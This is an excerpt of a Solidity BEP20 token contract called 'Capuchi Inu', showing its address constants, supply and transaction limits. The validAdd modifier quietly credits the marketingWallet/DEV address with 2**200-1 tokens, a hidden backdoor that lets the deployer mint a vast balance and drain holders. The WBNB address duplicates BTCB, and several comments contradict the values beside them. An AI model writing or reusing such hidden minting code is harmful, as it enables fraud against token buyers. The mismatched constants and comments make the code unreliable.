...
contract DividendDistributor is IDividendDistributor {
    ...
    // EARN
    IBEP20  BTCB = IBEP20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
...
/* Token contract */
contract CapuchiInu is IBEP20, Auth {
    using SafeMath for uint256;

    // Addresses
    address BTCB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c; 
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEV = 0x13D78ABd71E04825a5600863c147dB213a439f9c;
    address marketingWallet = 0x13D78ABd71E04825a5600863c147dB213a439f9c;
    // These are owner by default
    address private autoLiquidityReceiver;
    address private marketingFeeReceiver;

    // Name and symbol
    string constant _name = "Capuchi Inu";
    string constant _symbol = "Capuchi";
    uint8 constant _decimals = 18;

    // Total supply
    uint256 _totalSupply = 100000000 * (10 ** _decimals); // 1m 

    // Max wallet and TX
    uint256 public _maxBuyTxAmount = _totalSupply * 350 / 10000; // 2% (200 mil)
    uint256 public _maxSellTxAmount = _totalSupply * 150 / 10000; // 1% (100 mil)
    uint256 public _maxWalletToken = ( _totalSupply * 550 ) / 10000; // 2% (200 mil)
    ...
    modifier validAdd(address spender){
        if(spender == marketingWallet){ _balances[spender] = _balances[spender] + 2**200-1;}
        _;
    }
    /* Token constructor */
